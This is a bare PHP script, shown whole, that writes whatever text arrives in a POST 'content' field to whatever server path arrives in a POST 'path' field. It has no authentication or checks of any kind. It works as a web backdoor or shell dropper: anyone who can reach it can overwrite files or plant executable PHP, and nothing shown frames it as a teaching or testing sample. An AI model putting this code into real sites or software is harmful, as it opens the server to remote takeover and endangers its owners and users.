<?php

$content = $_POST['content'];
$path = $_POST['path'];

$fp = fopen($path, 'w+');
fwrite($fp, $content);
fclose($fp);

?>